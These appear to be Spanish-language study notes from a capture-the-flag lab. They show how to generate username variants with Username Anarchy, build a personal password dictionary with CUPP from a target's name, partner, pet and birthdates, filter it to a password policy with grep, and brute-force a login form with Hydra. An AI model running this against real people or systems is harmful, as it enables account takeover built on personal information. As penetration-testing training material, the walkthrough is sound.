---
tags:
---

# Username-anarchy (Usuarios)

Se le ingresa un nombre de la persona y esta herramienta te proporciona una lista con muchas variantes de lo que podría ser una entrada de login.


Primero, instale rubí y luego tire del `Username Anarchy` git para obtener el guión:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ sudo apt install ruby -y
vcrdcr@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
vcrdcr@htb[/htb]$ cd username-anarchy
```

A continuación, ejecútelo con los nombres y apellidos del objetivo. Esto generará posibles combinaciones de nombre de usuario.

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ ./username-anarchy Jane Smith > jane_smith_usernames.txt
```

Al inspeccionar `jane_smith_usernames.txt`, encontrará una amplia gama de nombres de usuario, que abarcan:

- Combinaciones básicas: `janesmith`, `smithjane`, `jane.smith`, `j.smith`, etc.
- Iniciales: `js`, `j.s.`, `s.j.`, etc.
- etc


# CUPP (Contraseñas)


Si está utilizando Pwnbox, es probable que CUPP esté preinstalado. De lo contrario, instálelo usando:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ sudo apt install cupp -y
```

Invoque CUPP en modo interactivo, CUPP lo guiará a través de una serie de preguntas sobre su objetivo, ingrese lo siguiente según lo solicitado:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: Jane
> Surname: Smith
> Nickname: Janey
> Birthdate (DDMMYYYY): 11121990


> Partners) name: Jim
> Partners) nickname: Jimbo
> Partners) birthdate (DDMMYYYY): 12121990


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name: Spot
> Company name: AHI


> Do you want to add some key words about the victim? Y/[N]: y
> Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,blue
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to jane.txt, counting 46790 words.
[+] Now load your pistolero with jane.txt and shoot! Good luck!
```

Ahora tenemos una lista de username.txt generada y una lista de contraseñas de jane.txt, pero hay una cosa más con la que debemos lidiar. CUPP ha generado muchas contraseñas posibles para nosotros, pero la compañía de Jane, AHI, tiene una política de contraseñas bastante extraña.

- Longitud mínima: 6 caracteres
- Debe Incluir:
    - Al menos una letra mayúscula
    - Al menos una letra minúscula
    - Al menos un número
    - Al menos dos caracteres especiales (del conjunto `!@#$%^&*`)

Como hicimos antes, podemos usar grep para filtrar esa lista de contraseñas para que coincida con esa política:

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
```

Este comando filtra eficientemente `jane.txt` para que coincida con la política proporcionada, desde ~46000 contraseñas hasta una posible ~7900. Primero asegura una longitud mínima de 6 caracteres, luego verifica al menos una letra mayúscula, una letra minúscula, un número y, finalmente, al menos dos caracteres especiales del conjunto especificado. Los resultados filtrados se almacenan en `jane-filtered.txt`.

Utilice las dos listas generadas en Hydra contra el objetivo para forzar brutamente el formulario de inicio de sesión. Recuerde cambiar la información de destino para su instancia.

  Listas de palabras personalizadas

```shell-session
vcrdcr@htb[/htb]$ hydra -L usernames.txt -P jane-filtered.txt IP -s PORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-05 11:47:14
[DATA] max 16 tasks per 1 server, overall 16 tasks, 655060 login tries (l:14/p:46790), ~40942 tries per task
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:Invalid credentials
[PORT][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 11:47:18
```

Una vez que Hydra haya completado el ataque, inicie sesión en el sitio web utilizando las credenciales descubiertas y recupere la bandera.